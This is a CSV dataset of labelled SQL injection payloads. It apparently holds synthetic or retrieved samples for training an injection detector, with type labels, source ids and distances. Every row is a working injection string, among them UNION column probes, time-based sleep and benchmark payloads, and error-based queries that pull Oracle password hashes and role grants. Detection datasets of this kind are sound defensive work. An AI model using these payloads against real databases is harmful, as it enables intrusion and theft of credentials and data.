id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001159,attack,boolean,"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R002293,0.061644851033060125
SMOTE_001160,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000026,0.0
SMOTE_001161,attack,other,"\', desc users, --",nearest_attack_euclidean,R000167,0.4826429666128753
SMOTE_001162,attack,boolean,"1%'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R007045,0.601624637782169
SMOTE_001163,attack,boolean,"1""  )   where 7950  =  7950 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001538,0.13519355629068133
SMOTE_001164,attack,union,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R008206,1.1920928955078125e-07
SMOTE_001165,attack,union,"-4947' in boolean mode  )   union all select 3314,3314#",nearest_attack_euclidean,R002841,0.3135941408510215
SMOTE_001166,attack,union,"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R006121,0.16705269545627713
SMOTE_001167,attack,boolean,"-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl",nearest_attack_euclidean,R003813,0.15434372242015654
SMOTE_001168,attack,other,select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,nearest_attack_euclidean,R003162,0.02209041232612436
SMOTE_001169,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000190,3.371747880871523e-07
SMOTE_001170,attack,boolean,"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R006840,0.23648929513565645
SMOTE_001171,attack,boolean,"-6681""  )   or 5251  =  1162",nearest_attack_euclidean,R004912,0.09494028896703229
SMOTE_001172,attack,boolean,1 and   (  3020  =  3020  )  *6703,nearest_attack_euclidean,R007302,0.02993525601929752
SMOTE_001173,attack,error,"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  8529  =  8529",nearest_attack_euclidean,R007446,0.5480136154754721
SMOTE_001174,attack,boolean,"1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R003980,0.15890385019982267
SMOTE_001175,attack,boolean,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000237,0.05543292109579095
SMOTE_001176,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R005044,0.03929591204461777
SMOTE_001177,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R003626,0.3503413829140399
SMOTE_001178,attack,boolean,"-9840   )    )    as thod where 4790  =  4790 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R004760,0.4699758827205852
SMOTE_001179,attack,boolean,"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003511,0.9904267752059229
SMOTE_001180,attack,boolean,"1""   )    )    as thoj where 1577  =  1577 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R002071,0.08910887412192885
SMOTE_001181,attack,time,1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R007085,0.09333755014351093
SMOTE_001182,attack,time,"1"" and sleep  (  5  )  #",nearest_attack_euclidean,R004802,0.16065011508821908
SMOTE_001183,attack,other,1   )    )    as muyz where 6105  =  6105,nearest_attack_euclidean,R000889,0.02486054731275951
SMOTE_001184,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R003977,0.4579174963710363
SMOTE_001185,attack,time,1' in boolean mode  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R002862,0.807372970731605
SMOTE_001186,attack,boolean,"1""  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R007245,0.22515376872118123
SMOTE_001187,attack,time,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R004404,0.4667669422563046
SMOTE_001188,attack,time,"1""   )    )     )   or sleep  (  5  )  #",nearest_attack_euclidean,R007989,0.12318339984349153
SMOTE_001189,attack,union,"1""   )    )    as fapw where 4722  =  4722 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R008109,0.19493411173500239
SMOTE_001190,attack,error,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr",nearest_attack_euclidean,R004146,0.8571802388823311
SMOTE_001191,attack,union,"1 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R008969,0.023558566320094072
SMOTE_001192,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'pfle' like 'pfle,nearest_attack_euclidean,R008374,0.28312560254932034
SMOTE_001193,attack,boolean,1'  )   and 4380  =  5851 and   (  'cxcl'  =  'cxcl,nearest_attack_euclidean,R004233,0.13734741165922024
SMOTE_001194,attack,boolean,"1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R003938,0.018034606551948332
SMOTE_001195,attack,other,select   (  case when   (  9343  =  9513  )   then 1 else 9343*  (  select 9343 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006049,0.0016752198958554715
SMOTE_001196,attack,time,"1"" where 5796  =  5796 and sleep  (  5  )  #",nearest_attack_euclidean,R002944,0.1921091478405463
SMOTE_001197,attack,error,"1' where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R001614,0.0016872462733268463
SMOTE_001198,attack,other,"1%""   )    )     )   order by 1#",nearest_attack_euclidean,R008313,0.13444212089998595
SMOTE_001199,attack,other,"-8065""   )    )     )   order by 1--",nearest_attack_euclidean,R008312,0.6876915732566027
SMOTE_001200,attack,union,"1' in boolean mode  )   union all select null,null,null,null--",nearest_attack_euclidean,R004181,0.19248998112785806
SMOTE_001201,attack,boolean,"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'ydxb'  =  'ydxb",nearest_attack_euclidean,R008818,0.39842488744188864
SMOTE_001202,attack,boolean,-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,nearest_attack_euclidean,R001684,0.044958293691580255
SMOTE_001203,attack,time,select sleep  (  5   )    )   +',nearest_attack_euclidean,R003672,0.963122467481635
SMOTE_001204,attack,boolean,1'+  (  select yjtm where 3965  =  3965 and 9389  =  3443,nearest_attack_euclidean,R007973,0.16219361234392216
SMOTE_001205,attack,boolean,"-8429'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'bwih' like 'bwih",nearest_attack_euclidean,R001703,0.2300796992541673
SMOTE_001206,attack,boolean,"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R001704,1.8657700612043404
SMOTE_001207,attack,boolean,"1"" where 2204  =  2204 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R002769,0.17721536790219586
SMOTE_001208,attack,boolean,-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,nearest_attack_euclidean,R005600,0.07387808294869543
SMOTE_001209,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R002741,0.05473158668620435
SMOTE_001210,attack,error,"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qfvg'  =  'qfvg",nearest_attack_euclidean,R002358,0.18835961516555355
SMOTE_001211,attack,boolean," select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",nearest_attack_euclidean,R000027,1.1920928955078125e-07
SMOTE_001212,attack,boolean," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000151,0.13373604686990226
SMOTE_001213,attack,time,"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R005132,0.27836304720735017
SMOTE_001214,attack,error,"1   )    )    as yfvg where 1454  =  1454 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R002150,0.4127836489674116
SMOTE_001215,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000203,0.0
SMOTE_001216,attack,other,1'+  (  select zwsr where 6567  =  6567,nearest_attack_euclidean,R003705,0.0
SMOTE_001217,attack,union,"-1204'   )    )    union all select 3585,3585--",nearest_attack_euclidean,R008808,0.15114251142297386
SMOTE_001218,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R005214,0.16201693838838013
SMOTE_001219,attack,boolean,"1'+  (  select wkay where 5476  =  5476 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   +'",nearest_attack_euclidean,R004102,0.6094764398447909
SMOTE_001220,attack,other,1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,nearest_attack_euclidean,R005326,1.1201059227703565
SMOTE_001221,attack,union,"-8358'   )    )     )   union all select 7282,7282--",nearest_attack_euclidean,R007235,0.011935309953582648
SMOTE_001222,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001840,0.009252215948703898
SMOTE_001223,attack,boolean,-5615'  )   where 5931  =  5931 or 8450  =  9229,nearest_attack_euclidean,R008210,0.345588334923898
SMOTE_001224,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""%""  =  """,nearest_attack_euclidean,R002252,0.17487396651810086
SMOTE_001225,attack,union,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",nearest_attack_euclidean,R002898,0.11136870429642191
SMOTE_001226,attack,other,select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R001459,0.005333400907668513
SMOTE_001227,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R006722,0.5341169948373329
SMOTE_001228,attack,error,1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'qtul' like 'qtul,nearest_attack_euclidean,R007716,0.004356223949903488
SMOTE_001229,attack,error,1%'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',nearest_attack_euclidean,R005433,0.20355410752972194
SMOTE_001230,attack,union,"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",nearest_attack_euclidean,R002733,0.01906888015847672
SMOTE_001231,attack,boolean,"1%""   )    )     )   and 1594  =  8757",nearest_attack_euclidean,R007652,0.044012008492761025
SMOTE_001232,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R007109,0.2715345755429694
SMOTE_001233,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R003249,0.09334282056578407
SMOTE_001234,attack,other,1'   )    )    as cjjm where 1981  =  1981,nearest_attack_euclidean,R002811,0.03697478234922187
SMOTE_001235,attack,error,-3424'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'dyuo'  =  'dyuo,nearest_attack_euclidean,R004471,0.19180628484304466
SMOTE_001236,attack,union,"1 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R008969,0.06561733365823959
SMOTE_001237,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R002238,0.22393836453796692
